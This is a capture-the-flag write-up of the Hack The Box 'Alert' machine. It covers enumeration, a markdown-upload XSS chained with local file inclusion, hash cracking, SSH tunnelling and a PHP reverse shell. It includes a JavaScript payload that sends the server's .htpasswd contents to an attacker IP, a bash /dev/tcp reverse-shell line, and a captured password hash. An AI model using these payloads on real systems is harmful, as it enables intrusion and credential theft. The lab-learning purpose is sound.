# Alert Hack The Box Machine (Linux)

## nmap
`nmap -sVC 10.10.11.44`

Results:
22
80

## http
`sudo vim /etc/hosts`
Takes a while to refresh

Markdown Viewer were we can upload a file. And after trying to upload a .php file it gives an error stating that you can only upload .md 
Contact page lets a submit a form and Donation page as well. We can use inspect and go to the network tool and see how that works. 

### gobuster 
Results:
/.hta                 (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/css                  (Status: 301) [Size: 304] [--> http://alert.htb/css/]
/index.php            (Status: 302) [Size: 660] [--> index.php?page=alert]
/messages             (Status: 301) [Size: 309] [--> http://alert.htb/messages/]
/server-status        (Status: 403) [Size: 274]
/uploads              (Status: 301) [Size: 308] [--> http://alert.htb/uploads/]

Denied permission for both **/messages** and **/uploads**.

### ffuf
`ffuf -u http://alert.htb -H "HOST:FUZZ.alert.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -ac`
Results:
statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 75ms]

Added to my **/etc/hosts**
Prompted to enter password.

### File Upload 
I created a payload to exploit the Local File Inclusion (LFI) vulnerability, targeting the messages.php file to access sensitive configuration files on the server.
```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.15.26:7777/?file_content=" + encodeURIComponent(data));
  });
</script>

```
Was able to obtain a link. That is used to excute the code inside the **.md** file. 

#### netcat listener
`nc -lvnp 7777`
When going to the link we obtained on the browser gave me this:
```
listening on [any] 7777 ...
connect to [10.10.15.26] from (UNKNOWN) [10.10.15.26] 41798
GET /?file_content=%0A HTTP/1.1
Host: 10.10.15.26:7777
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://alert.htb/
Origin: http://alert.htb
Connection: keep-alive

```
Now in Contact Us pasting the link in the message container.
Results:
```
listening on [any] 7777 ...
connect to [10.10.15.26] from (UNKNOWN) [10.10.11.44] 59376
GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1
Host: 10.10.15.26:7777
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
Accept: */*
Origin: http://alert.htb
Referer: http://alert.htb/
Accept-Encoding: gzip, deflate

```

Used CyberChef to decode this part of the URL `%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A`
Results:
`<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>`

Grabbed this `$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`
`vim hash`
`john --wordlist=rockyou.txt hash`
prompting me to use `--format=md5crypt-long hash` instead

Got the password.

## SSH
Got user flag. 

Ran netstat to find if there is any internal ports that are running.
`netstat -tulpn`
Results:
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        2      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -

Back on your local machine:
`ssh -L 8080:127.0.0.1:8080 albert@alert.htb`
The command creates an SSH connection to `albert@alert.htb` and forwards traffic from your local machine's port 8080 to port 8080 on the remote server (`alert.htb`). 
This allows you to access a service running on `127.0.0.1:8080` of the remote machine as if it were running on your local machine's port 8080.

Viewing the the bottom of the page we can see this, "Website Monitor is an open source project inspired by broke.lol. Download it on GitHub."

`albert@alert:~$ find / -name "website-monitor" 2>/dev/null` Searche for "website-monitor" across the entire system, ignoring error messages.

Once in the directory; find a **config** directory.

In the **config** directory we can see other **.php** files. Here is where I uploaded my reverse shell **php** code. 
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.11.23/7777 0>&1'");
```

From I set up a netcat listener and on the browser I went to the webpage directory of /config/rvshell.php
Here I saw a connect:
`whoami`
`ls`
`cd /root`
`ls`
`cat root.txt`

PWNED!

# Summary and Key Takeaways:

This exercise involved a variety of penetration testing techniques to exploit a web application. The goal was to gain access to sensitive data and escalate privileges on a target machine.

1. **Initial Recon and Enumeration**:
   - **Nmap** was used to identify open ports (22 for SSH, 80 for HTTP), which guided the next steps.
   - **Gobuster** and **ffuf** were used to enumerate directories and subdomains, revealing accessible resources and restricted areas (403 errors, 301 redirects).

2. **Exploiting File Upload Vulnerability**:
   - The ability to upload files was exploited, despite restrictions (only `.md` allowed), by leveraging **Local File Inclusion (LFI)**.
   - The LFI vulnerability was used to retrieve sensitive configuration files, such as `.htpasswd`, which provided the credentials needed for SSH access.

3. **Privilege Escalation**:
   - Cracked the password using **John the Ripper** and gained SSH access with user privileges.
   - After identifying an open internal service (port 8080), **SSH tunneling** was used to access it.

4. **Reverse Shell and Root Privileges**:
   - A reverse shell was uploaded to gain remote control over the target system.
   - From the shell, privilege escalation was achieved by finding and accessing root-level files, resulting in obtaining the root flag.

---

## Key Takeaways:
- **LFI Vulnerabilities**: Local File Inclusion vulnerabilities can be used to read sensitive files on the server, such as `.htpasswd` or other configuration files.
- **File Uploads**: Even when file uploads are restricted, vulnerabilities can often be bypassed by crafting payloads to exploit weaknesses in the system (e.g., uploading PHP reverse shells).
- **Password Cracking**: Tools like **John the Ripper** are useful for cracking hashes from files like `.htpasswd`.
- **SSH Tunneling**: **SSH port forwarding** is a great technique for accessing services behind firewalls or on internal networks.
- **Reverse Shells**: Uploading a reverse shell can be a powerful method for gaining persistent access to a compromised machine.
  
## Things to Remember:
- Always perform thorough enumeration to identify all accessible resources, including hidden or protected directories.
- Use LFI vulnerabilities for reading sensitive files or triggering remote code execution, especially when paired with other vulnerabilities (e.g., file uploads).
- SSH tunneling allows you to bypass network restrictions and access internal services directly.
- Reverse shells should be used with caution, as they provide full remote access to a compromised system, allowing you to further escalate privileges and access sensitive data. 


